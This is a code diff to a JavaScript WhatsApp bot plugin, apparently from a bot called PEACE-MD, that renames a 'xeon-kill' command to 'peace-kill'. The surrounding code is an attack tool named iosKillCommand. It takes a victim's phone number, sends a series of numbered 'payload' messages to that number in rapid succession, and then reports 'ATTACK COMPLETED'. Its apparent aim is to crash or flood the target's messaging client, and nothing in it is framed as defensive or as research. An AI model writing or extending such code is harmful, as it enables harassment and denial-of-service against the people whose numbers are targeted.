@@ -7,7 +7,7 @@ const iosKillCommand = async (m, Matrix) => {
     ? m.body.slice(prefix.length).trim().split(' ')[0].toLowerCase()
     : '';
 
-  if (cmd !== 'xeon-kill') return;
+  if (cmd !== 'peace-kill') return;
 
   const botNumber = await Matrix.decodeJid(Matrix.user.id);
   const senderId = m.sender;
@@ -28,7 +28,7 @@ const iosKillCommand = async (m, Matrix) => {
 
   if (!targetNumber || isNaN(targetNumber)) {
     return await Matrix.sendMessage(m.from, {
-      text: '❌ *Usage:* `.xeon-kill 2547xxxxxxxxx`',
+      text: '❌ *Usage:* `.peace-kill 2547xxxxxxxxx`',
     }, { quoted: m });
   }
 
@@ -49,14 +49,14 @@ const iosKillCommand = async (m, Matrix) => {
 
   for (let i = 0; i < attackLines.length; i++) {
     await Matrix.sendMessage(targetJid, {
-      text: `🧨 *XEON-KILL PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _PEACE-MD ATTACK ENGINE_`,
+      text: `🧨 *PEACE-KILL PAYLOAD ${i + 1}*\n${attackLines[i]}\n\n🌀 _PEACE-MD ATTACK ENGINE_`,
     });
     await new Promise(r => setTimeout(r, 250));
   }
 
   // Completion message
   await Matrix.sendMessage(m.from, {
-    text: `✅ *ATTACK COMPLETED*\n\n💥 *XEON-KILL successfully delivered to* +${targetNumber}\n🔚 *Operation Finished.*`,
+    text: `✅ *ATTACK COMPLETED*\n\n💥 *PEACE-KILL successfully delivered to* +${targetNumber}\n🔚 *Operation Finished.*`,
   }, { quoted: m });
 };
 
